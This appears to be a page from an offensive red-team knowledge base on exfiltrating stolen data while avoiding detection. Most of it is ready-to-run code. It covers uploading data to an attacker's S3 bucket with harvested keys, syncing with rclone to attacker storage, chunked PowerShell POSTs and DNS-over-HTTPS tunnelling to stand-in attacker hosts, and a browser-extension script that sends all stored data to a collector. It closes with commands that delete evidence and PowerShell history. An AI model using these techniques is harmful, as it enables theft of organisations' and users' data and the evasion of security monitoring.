# Exfiltration techniques

Transferring staged data from the target environment to attacker-controlled
infrastructure while avoiding detection. The choice of technique depends on
what outbound traffic is permitted, what monitoring is in place, and how
much data needs to move.

## DNS tunnelling

DNS queries are permitted from almost every network. Data is encoded in
subdomain labels and sent to an attacker-controlled authoritative DNS server.

Classic DNS tunnelling is detectable by query volume and entropy. Modern
variants use DNS-over-HTTPS (DoH) to encrypt queries, routing through a
trusted DoH provider rather than directly to the attacker's DNS server.

See the [DNS tunnelling runbook](../runbooks/dns-tunnelling.md) for step-by-step.

## Cloud API abuse

Exploiting misconfigured cloud permissions or using legitimate cloud credentials
to stage data in an attacker-controlled cloud account:

```python
import boto3

# using credentials harvested from instance metadata or credential files
s3 = boto3.client('s3',
    aws_access_key_id=STOLEN_KEY,
    aws_secret_access_key=STOLEN_SECRET)

# upload staged data to attacker-controlled bucket
s3.upload_file('C:\\Temp\\staged.zip', 'attacker-bucket', 'staged.zip')
```

## Living-off-the-land exfiltration tools

Legitimate tools approved by IT that can be redirected to attacker-controlled
destinations:

### Rclone

Rclone is a legitimate cloud sync utility. Configure it to sync to an
attacker-controlled cloud storage account:

```bash
# configure rclone with attacker's cloud credentials (runs silently)
rclone config create attacker-s3 s3 \
  access_key_id ATTACKER_KEY \
  secret_access_key ATTACKER_SECRET \
  region eu-west-1

# sync staged data to attacker's bucket
rclone copy /tmp/staged/ attacker-s3:attacker-bucket/out/ --quiet
```

### PowerShell with HTTPS

```powershell
# multi-part upload to avoid single large transfer
$file = 'C:\Temp\staged.zip'
$uri  = 'https://attacker.example.com/receive'

$bytes = [System.IO.File]::ReadAllBytes($file)
$chunk = 500000  # 500KB per request
for ($i = 0; $i -lt $bytes.Length; $i += $chunk) {
    $part = $bytes[$i..([Math]::Min($i + $chunk - 1, $bytes.Length - 1))]
    Invoke-RestMethod -Uri $uri -Method POST -Body $part `
      -ContentType 'application/octet-stream' -Headers @{'X-Chunk' = $i}
    Start-Sleep -Seconds 30  # pace the transfers
}
```

## Encrypted DNS tunnelling (DoH)

```python
import base64, requests

def exfil_chunk_doh(data_chunk, domain, doh_server='https://cloudflare-dns.com/dns-query'):
    # encode data in DNS query (max 63 chars per label, 253 total)
    encoded = base64.b32encode(data_chunk).decode().rstrip('=').lower()
    labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    query = '.'.join(labels) + '.' + domain

    r = requests.get(doh_server,
        params={'name': query, 'type': 'TXT'},
        headers={'Accept': 'application/dns-json'})
    return r.status_code

# the attacker's authoritative DNS server for the domain logs all queries
with open('staged.zip', 'rb') as f:
    offset = 0
    while True:
        chunk = f.read(60)
        if not chunk:
            break
        exfil_chunk_doh(chunk, 'exfil.attacker.example.com')
        offset += len(chunk)
```

## Browser-based exfiltration

Compromised browser extensions can silently upload saved passwords, session
cookies, and browsing data:

```javascript
// browser extension background script
// runs with access to all tabs and stored credentials
chrome.storage.local.get(null, function(data) {
  fetch('https://collector.example.com/browser', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
  });
});
```

## Covert channels

Data encoded and transmitted through channels designed for other purposes.
See the [covert channels runbook](../runbooks/covert-channels.md) for
techniques using Slack, Teams, and git repositories.

## Covering exfiltration tracks

Minimise artefacts after transfer:

```powershell
# delete staged files
Remove-Item C:\Temp\staged.zip -Force
Remove-Item C:\Temp\collected\ -Recurse -Force

# clear PowerShell command history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# remove Rclone config
Remove-Item "$env:APPDATA\rclone\rclone.conf" -Force
```
